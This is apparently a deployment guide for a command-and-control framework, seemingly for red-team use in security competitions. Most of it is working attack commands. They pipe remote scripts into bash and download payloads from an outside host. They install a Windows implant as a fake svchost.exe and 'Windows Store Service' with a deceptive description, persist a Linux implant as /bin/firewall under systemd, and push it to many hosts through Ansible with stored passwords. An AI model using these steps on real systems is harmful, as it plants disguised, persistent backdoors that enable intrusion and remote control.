The following file contains documentation to manually deploy the agent, proxy server, or C2 server on both Windows and Linux.

Linux C2 Server

$ curl https://javalanche.net/install.sh | bash
$ javalanche C2


Linux Beacon Server

$ curl https://javalanche.net/install.sh | bash
$ javalanche Beacon


Windows Payload

ps> wget -o C:\Windows\fonts\svchost.exe https://javalanche.net/windowsPayload
ps> New-Service -name 'Windows Store Service' -BinaryPathName 'C:\Windows\fonts\svchost.exe' -DisplayName 'Windows Store Service' -Description 'This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly' -Startuptype Automatic
ps> Start-Service -name 'Windows Store Service'


Linux Payload

$ sudo apt update
$ sudo apt install curl -y
$ sudo curl -L -o /bin/firewall "http://javalanche.net/linuxPayload"
$ sudo chmod +x /bin/firewall
$ sudo curl -L -o /lib/systemd/system/firewall.service "http://javalanche.net/linuxServiceFile"
$ sudo chmod 644 /lib/systemd/system/firewall.service
$ sudo systemctl daemon-reload
$ sudo systemctl enable firewall
$ sudo systemctl start firewall

Linux Redirect Server

$ sudo apt update
$ sudo apt upgrade -y
$ sudo apt install curl -y
$ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/redirectServerSetup.sh?ref_type=heads
$ sudo chmod +x serverSetup.sh
$ sudo ./serverSetup.sh

Ansible Payload deployement
Prerequisites: A Linux machine with SSH access to all linux competition mahcines, and winrm access to all windows compeitition machines
$ sudo apt update
$ sudo apt upgrade -y
$ sudo apt install ansible ssh sshpass nano git -y
Note: the above dependencies satisfy windows deployment via winrm, and linux deployment via ssh. 
if deploying windows via psrp, the additional 2 commands will need to be run
$ sudo apt install pip -y
$ pip install pypsrp
$ git clone https://gitlab.ritsec.cloud/jms9508/Javalanche
$ cd Javalanche/Setup/Ansible
Note: In some competitions, you will be provided an inventory.yml file for deployment. 
You will have to edit the hosts: line in the playbook to reflect the group of hosts to deploy to.
If you are not given an inventory.yml file, you will need to edit the existing inventory.yml 
file to include the proper hosts, usernames, and passwords
$ ansible-playbook -i inventory/inventory.yml playbook.yml -deploy

Compiling payloads
Linux
GOOS=linux GOARCH=amd64 go build -ldflags '-linkmode external -extldflags "-static"' -o linux  main.go
Windows
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o windows.exe main.go
